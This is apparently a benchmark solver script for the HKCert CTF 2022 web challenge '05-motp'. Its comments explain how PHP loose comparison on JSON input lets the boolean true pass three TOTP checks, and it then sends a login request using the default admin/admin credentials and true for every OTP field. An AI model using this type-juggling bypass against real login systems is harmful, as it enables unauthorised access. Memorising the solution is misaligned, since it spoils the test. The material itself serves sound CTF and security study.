#!/usr/bin/env bash
# HKCert CTF 2022 — "05-motp" (web)
#
# "The next-gen defense in depth strategy: multiple one-time password!" — one
# password and three TOTP codes, each checked against its own secret. The
# secrets are generated fresh every time the page is loaded, so there is nothing
# to steal and nothing to guess.
#
# There is also nothing to guess, because the check is `==`:
#
#     if (!Google2FA::verify_key($user_data['key1'], $_DATA['otp1']))
#     ...  if (self::oath_hotp($binarySeed, $ts) == $key) return true;
#
# and `$_DATA` is `json_decode(file_get_contents('php://input'), true)`, so the
# submitted code keeps whatever type the JSON gave it. PHP compares a string to
# a boolean by casting the string, and every six-digit code is a non-empty
# string, so `"493051" == true` holds on the first window it tries. Three
# secrets, three comparisons, one `true` each.
#
# The password is not juggled — `password_verify` is typed — but it does not
# need to be: the seed user is `admin` / `admin`.
#
# Defence in depth multiplies the number of secrets and not the number of
# checks, and the JSON body is what carries the type that breaks the check. h5i
# sends `--set json.otp1=true` as a JSON boolean rather than as the string
# "true", which is the difference between this working and not.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="cybench-motp-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

send "$SESSION" req_0 --create \
    --set "url=$URL/login.php" \
    --set method=POST \
    --set header.Content-Type=application/json \
    --set json.username=admin \
    --set json.password=admin \
    --set json.otp1=true \
    --set json.otp2=true \
    --set json.otp3=true |
    flag
